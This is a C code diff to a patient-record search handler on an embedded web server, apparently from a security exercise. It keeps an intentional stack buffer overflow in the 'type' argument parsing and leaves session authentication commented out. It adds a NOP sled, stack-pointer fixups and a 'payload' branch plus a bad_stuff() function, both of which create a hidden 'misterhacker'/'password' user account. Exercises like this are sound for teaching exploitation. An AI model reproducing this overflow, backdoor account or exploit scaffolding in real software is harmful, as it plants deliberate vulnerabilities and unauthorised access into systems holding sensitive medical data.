@@ -46,6 +46,8 @@ database_search_result_t * GetDrSearchResult( char *cgistr );
 
 CGI_FUNCTION(void, ShowSearchResult, database_search_result_t *search_result);
 
+int not_stack_smash = 0;
+
 BaseType_t CgiSearchResults( char *pcWriteBuffer, size_t xWriteBufferLen,
     char *pcHeaderBuffer, size_t xHeaderBufferLen,
     const char *pcCgiArgs )
@@ -55,16 +57,12 @@ BaseType_t CgiSearchResults( char *pcWriteBuffer, size_t xWriteBufferLen,
   user_t *user;
   database_search_result_t *search_result;
 
-  printf("in CgiSearchResults\n  parsing:\n");
+  /* printf("in CgiSearchResults\n  parsing:\n"); */
 
   CgiArgValue(session_id, sizeof(session_id), "sessionId", pcCgiArgs);
 
-  printf("    session_id: %s\n", session_id);
+  /* printf("    session_id: %s\n", session_id); */
   
-  if(DatabaseInit() == false) {
-    return HTTP_INTERNAL_SERVER_ERROR;
-  }
-
   /* user = AuthCheckSessionId(session_id); */
   /* if (user == NULL) { */
   /*   return HTTP_UNAUTHORIZED; */
@@ -100,10 +98,10 @@ void parse_search_cgistr(char *pcCgiArgs, char *type, char *first_name,
   memset(llast_name, '\0', sizeof(llast_name));
   memset(laddress, '\0', sizeof(laddress));
   memset(lcondition, '\0', sizeof(lcondition));
+
+  /* printf("in parse_search_cgistr helper\n"); */
   
-  printf("in parse_search_cgistr helper\n");
-  
-  printf("  ltype @ 0x%x\n", ltype);
+  /* printf("  ltype @ 0x%x\n", ltype); */
   
   CgiArgValue(lfirst_name, USER_NAME_LENGTH, "firstname", pcCgiArgs);
   memcpy(first_name, lfirst_name, sizeof(lfirst_name));
@@ -117,12 +115,12 @@ void parse_search_cgistr(char *pcCgiArgs, char *type, char *first_name,
   CgiArgValue(lcondition, MEDICAL_NAME_LENGTH, "condition", pcCgiArgs);
   memcpy(condition, lcondition, sizeof(lcondition));
 
-  printf("    first name: %s\n", first_name);
-  printf("    last name: %s\n", last_name);
-  printf("    address: %s\n", address);
-  printf("    condition: %s\n", condition);
-
-  printf("gonna corrupt stack w bad ltype parse...\n");
+  /* printf("    first name: %s\n", first_name); */
+  /* printf("    last name: %s\n", last_name); */
+  /* printf("    address: %s\n", address); */
+  /* printf("    condition: %s\n", condition); */
+  /*  */
+  /* printf("gonna corrupt stack w bad ltype parse...\n"); */
   
   // bad length argument permits stack-based buffer overflow 
   CgiArgValue(ltype, USER_ADDRESS_LENGTH, "type", pcCgiArgs);
@@ -152,7 +150,63 @@ GetPatientSearchResult( char *cgistr )
   memset(condition, '\0', sizeof(condition));
   
   parse_search_cgistr(cgistr, type, first_name, last_name, address, condition);
- 
+  if(not_stack_smash) {
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("nop");
+    __asm("addi s0, sp, 336");
+    printf("Executing payload...\n");
+    DatabaseAddUser(UserCreate("misterhacker", "password", "Mister", "Hacker", "555 Technology Square"));
+  /* __asm("j 0x20405108"); */
+  }
+
   printf("PATIENT search parsed:\n");
   printf("  first name = %s\n", first_name);
   printf("  last name = %s\n", last_name);
@@ -167,6 +221,7 @@ GetPatientSearchResult( char *cgistr )
 				 strlen(last_name)  ? NULL : last_name,
 				 strlen(address)    ? NULL : address,
 				 NULL);
+
 
   return search_result;
 }
@@ -254,4 +309,13 @@ CGI_FUNCTION(void, ShowSearchResult, database_search_result_t *search_result)
   }
 
   CGI_PRINTF("</table>\n");
+}
+
+void bad_stuff( void )
+{
+  DatabaseAddUser(UserCreate("misterhacker", "password", "aa", "aa", "aaaaaaaaa"));
+  __asm("addi s0, sp, 352");
+  /* __asm("j 0x20405108"); */
+
+  /* goto EXPLOIT_DONE; */
 }
